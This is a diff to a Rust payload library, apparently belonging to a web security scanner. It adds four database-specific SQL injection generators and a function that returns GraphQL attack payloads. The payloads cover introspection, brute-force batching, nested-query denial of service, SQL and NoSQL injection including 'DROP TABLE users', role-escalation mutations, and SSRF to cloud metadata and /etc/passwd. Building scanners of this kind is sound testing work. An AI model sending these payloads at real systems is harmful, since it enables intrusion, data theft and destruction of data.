@@ -1848,6 +1848,10 @@ pub fn get_all_sqli_payloads() -> Vec<String> {
     all_payloads.extend(generate_postgresql_specific_sqli()); // 300+
     all_payloads.extend(generate_mssql_specific_sqli()); // 300+
     all_payloads.extend(generate_oracle_specific_sqli()); // 300+
+    all_payloads.extend(generate_h2_specific_sqli()); // 21+
+    all_payloads.extend(generate_mariadb_specific_sqli()); // 28+
+    all_payloads.extend(generate_cockroachdb_specific_sqli()); // 23+
+    all_payloads.extend(generate_sybase_specific_sqli()); // 29+
     all_payloads.extend(generate_modern_sqli_2024_2025()); // 5,000+
 
     all_payloads
@@ -2688,6 +2692,87 @@ pub fn generate_crlf_payloads() -> Vec<String> {
     ]
 }
 
+/// GraphQL injection payloads (25+ payloads)
+/// Targets: Introspection queries, batching attacks, nested queries, SQL/NoSQL through args
+pub fn generate_graphql_injection_payloads() -> Vec<String> {
+    let mut payloads = Vec::new();
+
+    // GraphQL introspection queries (information disclosure)
+    payloads.extend(vec![
+        r#"{"query":"query{__schema{types{name fields{name}}}}"}"#.to_string(),
+        r#"{"query":"query{__schema{queryType{name}mutationType{name}subscriptionType{name}}}"}"#.to_string(),
+        r#"{"query":"query{__type(name:\"User\"){name fields{name type{name}}}}"}"#.to_string(),
+        r#"{"query":"{__schema{directives{name args{name}}}}"}"#.to_string(),
+        r#"{"query":"query IntrospectionQuery{__schema{queryType{name}types{...FullType}}}fragment FullType on __Type{name fields{name}}"}"#.to_string(),
+    ]);
+
+    // GraphQL batching attacks (DoS, rate limit bypass)
+    payloads.extend(vec![
+        r#"[{"query":"query{user(id:1){name}}"},{"query":"query{user(id:2){name}}"},{"query":"query{user(id:3){name}}"}]"#.to_string(),
+        r#"[{"query":"mutation{login(user:\"a\",pass:\"1\")}"},{"query":"mutation{login(user:\"a\",pass:\"2\")}"},{"query":"mutation{login(user:\"a\",pass:\"3\")}"}]"#.to_string(),
+        r#"{"query":"query{u1:user(id:1){name}u2:user(id:2){name}u3:user(id:3){name}}"}"#.to_string(),
+    ]);
+
+    // GraphQL deeply nested queries (DoS)
+    payloads.extend(vec![
+        r#"{"query":"query{user{friends{friends{friends{friends{friends{name}}}}}}}"}"#.to_string(),
+        r#"{"query":"query{a{b{c{d{e{f{g{h{i{j{k{l{m{n{o{p{q}}}}}}}}}}}}}}}}}"}"#.to_string(),
+        r#"{"query":"query{user{posts{comments{author{posts{comments{author{name}}}}}}}}"}"#.to_string(),
+    ]);
+
+    // SQL injection through GraphQL arguments
+    payloads.extend(vec![
+        r#"{"query":"query{user(id:\"1' OR '1'='1\"){name}}"}"#.to_string(),
+        r#"{"query":"query{users(filter:\"1; DROP TABLE users--\"){name}}"}"#.to_string(),
+        r#"{"query":"mutation{createUser(name:\"test\",email:\"' OR 1=1--\"){id}}"}"#.to_string(),
+        r#"{"query":"query{search(q:\"test' UNION SELECT password FROM users--\"){results}}"}"#.to_string(),
+    ]);
+
+    // NoSQL injection through GraphQL arguments
+    payloads.extend(vec![
+        r#"{"query":"query{user(id:{\"$gt\":\"\"}){name}}"}"#.to_string(),
+        r#"{"query":"query{users(filter:{\"$where\":\"this.password.length>0\"}){name}}"}"#.to_string(),
+        r#"{"query":"mutation{login(user:\"admin\",pass:{\"$ne\":\"x\"})}"}"#.to_string(),
+        r#"{"query":"query{user(id:{\"$regex\":\".*\"}){name email password}}"}"#.to_string(),
+    ]);
+
+    // GraphQL field/directive overloading
+    payloads.extend(vec![
+        r#"{"query":"query{user(id:1){name @include(if:true) name @skip(if:false)}}"}"#.to_string(),
+        r#"{"query":"query{__typename @deprecated}"}"#.to_string(),
+        r#"{"query":"query{user{...on User{name}...on Admin{secretKey}}}"}"#.to_string(),
+    ]);
+
+    // GraphQL authorization bypass attempts
+    payloads.extend(vec![
+        r#"{"query":"query{user(id:1){id name email password secretToken}}"}"#.to_string(),
+        r#"{"query":"mutation{deleteUser(id:1)}"}"#.to_string(),
+        r#"{"query":"mutation{updateUser(id:1,role:\"admin\"){role}}"}"#.to_string(),
+        r#"{"query":"query{adminPanel{users{password}}}"}"#.to_string(),
+    ]);
+
+    // GraphQL SSRF through arguments
+    payloads.extend(vec![
+        r#"{"query":"mutation{importData(url:\"http://169.254.169.254/latest/meta-data/\")}"}"#.to_string(),
+        r#"{"query":"query{fetch(url:\"file:///etc/passwd\")}"}"#.to_string(),
+        r#"{"query":"mutation{webhook(url:\"http://localhost:8080/admin\")}"}"#.to_string(),
+    ]);
+
+    // GraphQL variables injection
+    payloads.extend(vec![
+        r#"{"query":"query($id:ID!){user(id:$id){name}}","variables":{"id":"1' OR '1'='1"}}"#.to_string(),
+        r#"{"query":"query($filter:String){users(filter:$filter){name}}","variables":{"filter":"{\"$gt\":\"\"}"}}"#.to_string(),
+    ]);
+
+    // GraphQL fragment injection
+    payloads.extend(vec![
+        r#"{"query":"query{user(id:1){...AdminFields}}fragment AdminFields on User{password apiKey secretToken}"}"#.to_string(),
+        r#"{"query":"query{...on Query{__schema{types{name}}}}"}"#.to_string(),
+    ]);
+
+    payloads
+}
+
 /// Get ALL advanced payloads combined
 pub fn get_all_advanced_payloads() -> Vec<String> {
     let mut all_payloads = Vec::new();
@@ -2704,6 +2789,7 @@ pub fn get_all_advanced_payloads() -> Vec<String> {
     all_payloads.extend(generate_ldap_payloads());
     all_payloads.extend(generate_xxe_payloads());
     all_payloads.extend(generate_crlf_payloads());
+    all_payloads.extend(generate_graphql_injection_payloads()); // 30+
 
     all_payloads
 }
